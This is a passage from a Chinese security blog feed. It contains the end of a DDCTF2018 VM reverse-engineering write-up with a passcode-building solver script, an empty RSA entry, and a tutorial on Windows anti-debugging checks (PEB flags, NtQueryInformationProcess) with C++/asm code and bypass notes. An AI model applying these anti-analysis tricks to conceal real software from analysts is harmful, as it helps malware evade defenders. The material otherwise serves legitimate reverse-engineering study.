punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>opcode如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">opcode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找到opcode在byte_603F00数组中的下标v2：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">v2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> opcode<span class="token punctuation">:</span>    v2<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>ida_chars<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment">#v2 = ['$', '8', 'C', 't', '0', 'E', 'u', '#', ';']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再动态调试找到opcode对应的函数及作用：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""通过分析得知对应变量的含义a1      ==&gt; heap_addra1+16   ==&gt; Passcodea1+664  ==&gt; next = Passcode[i+1]a1+665  ==&gt; byte  -- tempa1+288  ==&gt; DWORD -- str_indexa1+292  ==&gt; DWORD -- str_lena1+280  ==&gt; DWORD -- 0x110a1+8    ==&gt; DWORD -- str --&gt; "PaF0!&amp;Prv}H{ojDQ#7v="0::$ ==&gt; sub_400DC1: temp = str[str_index]1::8 ==&gt; sub_400E7A: str[str_index] = temp2::C ==&gt; sub_400F3A: temp = temp + next - 333::t ==&gt; sub_401064: temp = temp - next + 33  if !*(a1 + 665): ++temp 4::0 ==&gt; sub_4011C9: ++str_index5::E ==&gt; sub_40133D: check()6::u ==&gt; sub_4012F3:  --str_index  7::# ==&gt; sub_4014B9: {      if str_index &lt; str_len and next - 48 &lt; 41        str[str_index] = Passcode[str_index + next - 48] - 49}8::; ==&gt; sub_400CF1: {     str_index += next    if next - 16 &lt;= 89:         str[str_index] = Passcode[str_index + next - 48] - 49}"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们再回到sub_40113D这个函数，即对byte_603F00交叉引用跟踪到sub_40113D函数</p><ul><li>这里，就可以有想法了，我们的目标是输出<code>Binggo</code>，而这里输出str字符串，并且在上面可以看出：<code>#</code>，<code>；</code>对应的函数是可以修改str字符串的，所以我们只需要构造一个Passcode输入，把str字符串修改为<code>Binggo</code>即可，但是这里需要注意，str字符串长度为20比<code>Binggo</code>长度大，所以最后还有构造一个<code>\x00</code>去截断。</li></ul><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/6.png"></p><p>构造Passcode</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""举一个例子：$t/80$ ==&gt; temp = str[0] =  'P't ==&gt; temp = temp - next +33 = 'P' - next + 33，我们的目标是让temp为'B'，所以 next = '/'/8 ==&gt; str[0] = temp = 'B'0 ==&gt; str_index++ ==&gt; str_index = 1，处理下一个字符"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> <span class="token string">"PaF0!&amp;Prv}H{ojDQ#7v="</span>t <span class="token operator">=</span> <span class="token string">"Binggo"</span>s <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">+=</span> <span class="token string">"$"</span>    temp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">33</span>    <span class="token keyword">if</span> temp <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">:</span> <span class="token comment">#必须为可见字符</span>        temp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">33</span>        s <span class="token operator">+=</span> <span class="token string">"C"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        s <span class="token operator">+=</span> <span class="token string">'t'</span>    s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"80"</span>s <span class="token operator">+=</span> <span class="token string">"#"</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">-</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"1"</span> <span class="token comment">#构造\x00截断</span>s <span class="token operator">+=</span> <span class="token string">"uuuuuuEs"</span> <span class="token comment">#通过u把str_index移动到str最开始的位置，并通过E进入check()函数，s则绕过*(a1 + 664) == 's'检查</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token comment">#s = "$t/80$C)80$CI80$CX80$Cg80$Cj80#J1uuuuuuEs"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/7.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF-RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-RE </tag>
            
            <tag> VM逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA常见攻击</title>
      <link href="/2023/04/05/rsa-chang-jian-gong-ji/"/>
      <url>/2023/04/05/rsa-chang-jian-gong-ji/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
            <tag> Crypto </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AntiBebug</title>
      <link href="/2023/04/04/antibebug/"/>
      <url>/2023/04/04/antibebug/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="TEB、PEB结构简介"><a href="#TEB、PEB结构简介" class="headerlink" title="TEB、PEB结构简介"></a>TEB、PEB结构简介</h4><p>TEB：线程环境块。进程中每一个线程都有自己的TEB。系统在TEB中保存频繁使用的线程相关的数据，<strong>位于用户地址空间</strong>。在用户模式下，可通过CPU的FS寄存器来访问TEB所在段，<strong>一般存储在[FS:0]处</strong>。</p><p>PEB：进程环境块。存放进程信息，每个进程都有自己的PEB信息，位于用户地址空间。</p><p>TEB中我们关心的成员：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">+</span><span class="token number">0x000</span> NtTib   <span class="token operator">:</span>_NT_TIB<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">0x30</span> ProcessEnvironmentBlock       <span class="token operator">:</span>Ptr32_PEB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>1）NtTib结构体(TIB即线程信息块)</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token class-name">_NT_TIB</span><span class="token punctuation">{</span> <span class="token keyword">struct</span><span class="token class-name">_EXCEPTION_REGISTRATION_RECORD</span> <span class="token operator">*</span>ExceptionList<span class="token punctuation">;</span> PVOID StackBase<span class="token punctuation">;</span> PVOID StackLimit<span class="token punctuation">;</span>  PVOID SubSystemTib<span class="token punctuation">;</span>  <span class="token keyword">union</span> <span class="token punctuation">{</span>PVOID FiberData<span class="token punctuation">;</span> DWORD Version<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>  PVOID ArbitraryUserPointer<span class="token punctuation">;</span>  <span class="token keyword">struct</span><span class="token class-name">_NT_TIB</span> <span class="token operator">*</span>Self<span class="token punctuation">;</span><span class="token punctuation">}</span> NT_TIB<span class="token punctuation">;</span><span class="token keyword">typedef</span> NT_TIB <span class="token operator">*</span>PNT_TIB<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>0x00：ExceptionList指向_EXCEPTION_REGISTRATION_RECORD结构体(用于SEH)组成的链表;</li><li>0x18：self指向 NtTib自己，而 NtTib是TEB的第一个成员，所以self等于指向TEB结构体；</li></ul><p>在用户模式下，可以使用**Ntdll.NtCurrentTeb()**API得到TEB结构体的地址，即返回FS:[0x18]的值，self就位于FS:[0x18]地址处。</p><p>2）ProcessEnvironmentBlock(即PEB)</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">+</span><span class="token number">002</span>BeingDebugged <span class="token punctuation">;</span><span class="token function">Uchar</span><span class="token punctuation">(</span>可用于反调试技术<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">008</span>ImageBaseAddress  <span class="token punctuation">;</span>Ptr32 Void<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">00</span>cLdr  <span class="token punctuation">;</span>Ptr32 <span class="token function">_PEB_LDR_DATA</span><span class="token punctuation">(</span>可用于反调试技术<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">018</span>ProcessHeap  <span class="token punctuation">;</span>Ptr32 <span class="token function">Void</span><span class="token punctuation">(</span>可用于反调试技术<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">068</span>NtGlobalFlag   <span class="token punctuation">;</span><span class="token function">uint4B</span><span class="token punctuation">(</span>可用于反调试技术<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>+002：BeingDebugged标识当前进程是否处于调试状态，是则为1，否则为0。可以使用**IsDebuggerPresent()**API获取该值;</li><li>+008：ImageBaseAddress记录当前进程的ImageBase，可以使用**GetModuleHandle()**API用来获取ImageBase;</li><li>+00c：Ldr结构体，调试进程时，其堆内存区域中会出现一些特殊标识,表名它正处于被调试状态，未使用的堆内存区域全部填充着0xEEFEEEFE，利用这一特征可判断是否处于被调试状态。Ldr 指向 PEB_LDR_DATA结构体指针，PEB_LDR_DATA恰好是在堆中创建的。<strong>检测PEB_LDR_DATA是否是0xEEFEEEFE即可判断是否处于被调试</strong>；</li><li>+018：ProcessHeap结构体里面由两个重要成员；</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">+</span><span class="token number">0xC</span>  Flags<span class="token operator">+</span><span class="token number">0x10</span> ForceFlags程序正常运行时：​ HEAP<span class="token punctuation">.</span>Flags<span class="token operator">=</span><span class="token number">0x2</span>​ HEAP<span class="token punctuation">.</span>ForceFlags<span class="token operator">=</span><span class="token number">0</span>调试时会发生变化。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>+068：NtGlobalFlag，<strong>调试进程时，NtGlobalFlag会被置为0x70</strong>；</li></ul><p>得到如下地址关系：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">FS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> FS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0x18</span><span class="token punctuation">]</span> <span class="token operator">=</span> TEB<span class="token punctuation">.</span>NtTib<span class="token punctuation">.</span>self <span class="token operator">=</span> TEB<span class="token punctuation">.</span>NtTib <span class="token operator">=</span> address of SEH <span class="token operator">=</span> address of TEBFS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">]</span> <span class="token operator">=</span> TEB<span class="token punctuation">.</span>ProcessEnvironmentBlock <span class="token operator">=</span> address of PEB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="常见静态反调试（基本没用"><a href="#常见静态反调试（基本没用" class="headerlink" title="常见静态反调试（基本没用"></a>常见静态反调试（基本没用</h3><h4 id="PEB字段利用"><a href="#PEB字段利用" class="headerlink" title="PEB字段利用"></a>PEB字段利用</h4><h5 id="BeingDebugged（002）"><a href="#BeingDebugged（002）" class="headerlink" title="BeingDebugged（002）"></a>BeingDebugged（002）</h5><p>进程处于调试状态时，PEB.BeingDebugged成员的值设为非0，在非调试状态下为0;</p><ul><li>获取PEB.BeingDebugged</li></ul><pre class="line-numbers language-none"><code class="language-none">1)直接获取mov eax, FS:[0x30]movzx eax, Fs:[eax + 0x2]2)先获取TEB,再获取PEBmov eax, FS:[0x18]//mov eax, FS:[0]mov eax, FS:[eax + 0x30]movzx eax, Fs:[eax + 0x2]3)API获取(其实该API就是利用上述2)中的汇编)IsDebuggerPresent() APIBOOL IsDebuggerPresent();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>测试：直接(VS)F5调试即可，在OD中有插件会直接过掉反调试。</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int __declspec(naked) GetBeingBubugged() {__asm {push ebpmov ebp, espsub esp, 0x40push edipush esipush ebxpush ecxlea edi, dword ptr ds:[ebp-0x40]mov ecx, 0x10mov eax, 0xCCCCCCCCrep stos        //这就是IsDebuggerPresent()API的核心逻辑mov eax, dword ptr fs : [0x18]mov eax, dword ptr ds : [eax + 0x30]movzx eax, byte ptr ds : [eax + 0x2]pop ecxpop ebxpop esipop edimov esp, ebppop ebpret}}int main(){if (GetBeingBubugged()) {MessageBox(NULL, L"Funk You", L"AntiDebug", MB_OK);::ExitProcess(0);}system("pause");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接ctrl+F5时，并没有弹框；但是当F5调试时，弹框。</p><p><img src="/2023/04/04/antibebug/0.png" alt="Ctr1+F5"></p><p><img src="/2023/04/04/antibebug/1.png" alt="F5"></p><ul><li>直接修改PEB.BeingDebugged的值或者IsDebuggerPresent() 的返回值即可过掉(这个反调试拖入OD就被插件过掉了，就不演示)。</li></ul><h5 id="Ldr（00c）"><a href="#Ldr（00c）" class="headerlink" title="Ldr（00c）"></a>Ldr（00c）</h5><p>PEB.Ldr 指向_PEB_LDR_DATA结构体指针，_PEB_LDR_DATA恰好是在堆中创建的。检测_PEB_LDR_DATA是否是0xEEFEEEFE即可判断是否处于被调试；</p><ul><li>测试：我在自己电脑上并没有效果，看网上说这个方法在win vista之后已经无效，但还是记录一下。</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">//检测Ldr，Win XP有效DWORD __declspec(naked) GetLdr() {__asm {push ebpmov ebp, espsub esp, 0x40push edipush ecxlea edi, dword ptr ds:[ebp-0x40]mov ecx, 0x10mov eax, 0xCCCCCCCCrep stosmov eax, dword ptr fs : [0x18]mov eax, dword ptr ds : [eax + 0x30]mov eax, dword ptr ds : [eax + 0xC]pop ecxpop edimov esp, ebppop ebpret }}int AntiDubugByGetLdr() {DWORD ldrAddr = GetLdr();DWORD data = 0;int i = 0;HANDLE handle = ::OpenProcess(PROCESS_ALL_ACCESS, false, ::GetCurrentProcessId());while (i &lt; 0x1000){ReadProcessMemory(handle, (LPVOID)ldrAddr, &amp;data, 4, NULL);//判断内存中是否含有0xEEFEEEFEif (data == 0xEEFEEEFE)return 1;ldrAddr += 4;i++;}return 0;}int main(){if (AntiDubugByGetLdr()) {MessageBox(NULL, L"Funk You", L"AntiDebug", MB_OK);::ExitProcess(0);}system("pause");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将填充着0xEEFEEEFE的区域写为NULL即可过掉</li></ul><h5 id="ProcessHeap（018）"><a href="#ProcessHeap（018）" class="headerlink" title="ProcessHeap（018）"></a>ProcessHeap（018）</h5><p>程序正常运行时，ProcessHeap.Flags=0x2，ProcessHeap.ForceFlags=0，调试时会发生变化；</p><p>Win 7之后：ProcessHeap.Flags偏移为0x40，ProcessHeap.ForceFlags偏移为x44；</p><ul><li>测试：之前xp虚拟机被玩坏了）Win 10测试 <strong>我发现好像没有用，不管是否调试，Flags==0x2，ForceFlags==0</strong>；</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void AntiDebugByProcessHeap() {DWORD Flags;DWORD ForceFlags;__asm {push eax;mov eax, fs:[0x30];mov eax, ds:[eax + 0x18];mov eax, dword ptr[eax + 0x40]mov dword ptr[Flags], eax;mov eax, fs:[0x30];mov eax, ds:[eax + 0x18];mov eax, dword ptr[eax + 0x44]mov dword ptr[ForceFlags], eax;pop eax;}std::cout &lt;&lt; Flags &lt;&lt; std::endl &lt;&lt; ForceFlags &lt;&lt; std::endl;if (Flags != 2 || ForceFlags != 0) {MessageBox(NULL, L"Funk You", L"AntiDebug", MB_OK);::ExitProcess(0);}else {std::cout &lt;&lt; "Hello World!\n";}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="NtGlobalFlag（068）"><a href="#NtGlobalFlag（068）" class="headerlink" title="NtGlobalFlag（068）"></a>NtGlobalFlag（068）</h5><p>调试进程时，PEB.NtGlobalFlag会被置为0x70；</p><ul><li>测试：Win 10测试 <strong>好像还是没有用，不管是否调试，NtGlobalFlag==0</strong>；</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void AntiDebugByNtGlobalFlag() {DWORD Flags;__asm {push eax;mov eax, fs:[0x30];mov eax, [eax + 0x68]mov dword ptr[Flags], eax;pop eax;}std::cout &lt;&lt; Flags &lt;&lt; std::endl;if (Flags == 0x70) {MessageBox(NULL, L"Funk You", L"AntiDebug", MB_OK);::ExitProcess(0);}else {std::cout &lt;&lt; "Hello World!\n";}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Windows-API的利用"><a href="#Windows-API的利用" class="headerlink" title="Windows API的利用"></a>Windows API的利用</h4><h5 id="IsDebuggerPresent"><a href="#IsDebuggerPresent" class="headerlink" title="IsDebuggerPresent"></a>IsDebuggerPresent</h5><p>IsDebuggerPresent查询进程环境块(PEB)中的IsDebugged标志。</p><ul><li>如果进程没有运行在调试器环境中，函数返回0；</li><li>如果调试附加了进程，函数返回一个非零值。</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">BOOL IsDebuggerPresent();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="CheckRemoteDebuggerPresent"><a href="#CheckRemoteDebuggerPresent" class="headerlink" title="CheckRemoteDebuggerPresent"></a>CheckRemoteDebuggerPresent</h5><p>CheckRemoteDebuggerPresent同IsDebuggerPresent几乎一致。它不仅可以探测系统其他进程是否被调试，通过传递自身进程句柄还可以探测自身是否被调试。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">BOOL CheckRemoteDebuggerPresent(  [in]      HANDLE hProcess,  [in, out] PBOOL  pbDebuggerPresent);/*[in] hProcess进程的句柄。[in, out] pbDebuggerPresent如果正在调试指定的进程，则函数设置为 TRUE 的变量的指针，否则为 FALSE。*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="NtQueryInformationProcess"><a href="#NtQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess"></a>NtQueryInformationProcess</h5><p>该函数检索有关指定进程的信息，是ntdll.dll中一个未公开的API函数，需要自己加载；</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NTSYSAPI NTSTATUS NTAPI NtQueryInformationProcess (　　IN HANDLE 　　　　　　　　ProcessHandle, 　　　　　　 // 进程句柄　　IN PROCESSINFOCLASS 　　InformationClass, 　　　　 // 信息类型　　OUT PVOID 　　　　　　　　ProcessInformation, 　　　 // 缓冲指针　　IN ULONG 　　　　　　 　　ProcessInformationLength, // 以字节为单位的缓冲大小　　OUT PULONG 　　　　　 　　ReturnLength OPTIONAL     // 写入缓冲的字节数);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 与调试有关的第二个参数(InformationClass)的值:<br> ProcessDebugPort(0x07) , ProcessDebugObjectHandle(0x1E) , ProcessDebugFlags(0x1F)<br> 第二个参数指定不同的值 , 返回结果会返回在 ProcessInformation(第三个参数)；</p><ul><li><p>ProcessDebugPort(0x07)</p></li><li><p>进程处于调试状态时,操作系统会为他分配1个调试端口(debug port) , InformationClass设为ProcessDebugPort(0x07) 时,调用NtQueryInformationProcess()函数就可以获取调试端口.。<br> <strong>若处于调试状态 ，第三个参数会被置为0xFFFFFFFF(-1)<br> 若处于非调试状态，第三个参数值会被设置为0；</strong></p></li><li><p>CheckRemoteDebuggerPresent() API<br>实际上也是调用了NtQueryInformationProcess(ProcessDebugPort)</p></li><li><p>ProcessDebugObjectHandle(0x1E)</p><ul><li>调试进程时，会生成一个调试对象(Debug Obiect)。NtQueryInformationProcess()第二个参数值为0x1E时 , 函数的第三个参数就能获取到调试对象句柄 。<br><strong>进程处于调试状态==&gt;调试句柄存在==&gt;返回值不为NULL<br>处于非调试状态 , 返回值为NULL；</strong></li></ul></li><li><p>ProcessDebugFlags(0x1F)</p></li><li><p>调试标志:Debug Flags，检测调试标志的值也可以判断进程是否处于被调试状态；<br>NtQueryInformationProcess()第二个参数为0x1F<br><strong>第三个参数：调试状态：0，非调试状态：1；</strong></p></li></ul><p>测试代码：win 10可以测试成功；<strong>Note：</strong>定义函数指针时，我在win10中没有找到PROCESSINFOCLASS这个数据类型，但是它的本质就是一个’整数’，所以定义成DWORD就行。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">typedef NTSTATUS(WINAPI *PNtQueryInformationProcess)(_In_      HANDLE           ProcessHandle,_In_      DWORD   ProcessInformationClass,_Out_     PVOID            ProcessInformation,_In_      ULONG            ProcessInformationLength,_Out_opt_ PULONG           ReturnLength);void AntiDebugByNtQueryInformationProcess() {HMODULE ntdll = LoadLibrary(TEXT("Ntdll.dll"));if (ntdll == NULL) {std::cout &lt;&lt; "ntdll加载失败" &lt;&lt; std::endl;::ExitProcess(0);}PNtQueryInformationProcess NtQueryInformationProcess = (PNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");if (NtQueryInformationProcess == NULL) {std::cout &lt;&lt; "函数导入失败" &lt;&lt; std::endl;::ExitProcess(1);}DWORD isDebuggerPresent0 = FALSE;DWORD isDebuggerPresent1 = FALSE;DWORD isDebuggerPresent2 = FALSE;HANDLE handle = ::GetCurrentProcess();NTSTATUS status0 = NtQueryInformationProcess(handle, 0x7, &amp;isDebuggerPresent0, sizeof(DWORD), NULL);NTSTATUS status1 = NtQueryInformationProcess(handle, 0x1E, &amp;isDebuggerPresent1, sizeof(DWORD), NULL);NTSTATUS status2 = NtQueryInformationProcess(handle, 0x1F, &amp;isDebuggerPresent2, sizeof(DWORD), NULL);std::cout &lt;&lt; isDebuggerPresent0 &lt;&lt; std::endl &lt;&lt; isDebuggerPresent1 &lt;&lt; std::endl &lt;&lt; isDebuggerPresent2 &lt;&lt; std::endl;if (!status0 &amp;&amp; !status1 &amp;&amp; !status2 &amp;&amp; isDebuggerPresent0 &amp;&amp; isDebuggerPresent1 &amp;&amp; !isDebuggerPresent2){MessageBoxA(NULL, "Debug detected", "NtQueryInformationProcess", MB_OK);return;}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/04/antibebug/2.png"></p><h5 